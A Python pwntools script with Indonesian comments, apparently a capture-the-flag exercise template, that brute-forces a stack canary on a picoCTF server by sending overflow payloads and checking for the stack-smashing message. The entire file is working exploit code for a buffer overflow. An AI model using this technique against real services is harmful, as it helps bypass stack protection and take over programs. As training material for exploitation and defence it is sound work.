from pwn import *

# Nonaktifkan log pwntools yang terlalu berisik
context.log_level = 'error'

canary = b""

print("[*] Memulai proses brute-force canary...")

# Loop untuk 4 byte canary
for i in range(4):
    for guess in range(256):
        # Membuka koneksi ke program lokal
        # p = process('./vuln') 
        p = remote('saturn.picoctf.net', 50238) # Jika program berjalan di server, gunakan ini untuk koneksi jarak jauh
        
        # Mengubah angka tebakan (0-255) menjadi format raw byte tunggal
        byte_guess = bytes([guess]) 
        
        # ----------------------------------------------------
        # BAGIAN ANDA:
        # 1. Tentukan berapa angka/panjang yang harus dikirim saat program bertanya "How Many Bytes...?"
        # 2. Tentukan isi muatan (payload) saat program meminta "Input> "
        # ----------------------------------------------------
        
        panjang_input = b'68\n' # (Harus berupa string angka + newline, misal b'65\n')
        payload = b'A' * 64 + canary + byte_guess # (Gabungan dari sampah, canary yang sudah ditemukan, dan tebakan saat ini)

        # Mengirim panjang input
        p.recvuntil(b"How Many Bytes will You Write Into the Buffer?\n> ")
        p.send(panjang_input)
        
        # Mengirim payload
        p.recvuntil(b"Input> ")
        p.send(payload)
        
        # Membaca respon dari program
        response = p.recvall()
        
        # Jika TIDAK ADA tulisan "Stack Smashing Detected", berarti tebakan benar!
        if b"Stack Smashing Detected" not in response:
            canary += byte_guess
            print(f"[+] Byte {i+1} ditemukan: {hex(guess)}")
            p.close()
            break # Berhenti menebak byte ini, lanjut ke byte berikutnya
            
        p.close()

print(f"[*] Canary berhasil didapatkan: {canary}")